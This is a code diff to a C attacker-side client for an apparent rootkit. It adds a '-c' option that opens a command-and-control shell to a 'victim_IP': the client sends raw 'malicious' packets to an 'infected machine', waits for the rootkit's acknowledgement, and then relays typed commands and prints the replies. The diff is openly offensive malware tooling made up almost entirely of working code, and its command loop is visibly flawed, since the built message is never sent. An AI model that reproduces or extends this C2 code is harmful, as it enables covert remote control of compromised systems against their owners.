@@ -10,6 +10,7 @@
 #include <stdlib.h>
 
 #include "../common/constants.h"
+#include "../common/c&c.h"
 
 // For printing with colors
 #define KGRN  "\x1B[32m"
@@ -30,8 +31,11 @@ void print_welcome_message(){
 void print_help_dialog(const char* arg){
     printf("\nUsage: %s OPTION victim_IP\n\n", arg);
     printf("Program OPTIONs\n");
-    char* line = "-S";
+    char* line = "-S IP";
     char* desc = "Send a secret message to IP";
+    printf("\t%-40s %-50s\n\n", line, desc);
+    line = "-c IP";
+    desc = "Activate direct command & control shell with IP";
     printf("\t%-40s %-50s\n\n", line, desc);
     line = "-h";
     desc = "Print this help";
@@ -135,6 +139,46 @@ void send_secret_packet(char* argv){
     free(local_ip);
 }
 
+void activate_command_control_shell(char* argv){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, CC_PROT_SYN);
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+        return;
+    }else{
+        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
+    }
+    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
+    
+    //Wait for rootkit ACK to ensure it's up
+    rawsocket_sniff_pattern(CC_PROT_ACK);
+    printf("["KGRN"OK"RESET"]""Success!\n");   
+
+    //Received ACK, we proceed to send command
+    while(1){
+        char buf[BUFSIZ];                                                                                                                                                          
+        printf(""KYLW"c>:"RESET"");                                                                                                                                                              
+        scanf("%s", buf);                                                                                                                                                                             
+        if(rawsocket_send(packet)<0){
+            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+            return;
+        }
+        char msg[BUFSIZ];
+        strcpy(msg, CC_PROT_MSG);
+        strcat(msg, buf);
+        printf("Sending %s\n", msg);
+        packet_t packet = rawsocket_sniff_pattern(CC_PROT_MSG);
+        char* res = packet.payload;
+        printf(""KYLW"c>:"RESET" %s\n", res);   
+    }
+    
+    free(local_ip);
+}
+
 
 void main(int argc, char* argv[]){
     if(argc<2){
@@ -154,7 +198,7 @@ void main(int argc, char* argv[]){
     char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:c:h")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -164,6 +208,17 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             send_secret_packet(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
+            
+            break;
+        case 'c':
+            print_welcome_message();
+            sleep(1);
+            //Send a secret message
+            printf("["KBLU"INFO"RESET"]""Activated COMMAND & CONTROL shell\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            activate_command_control_shell(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
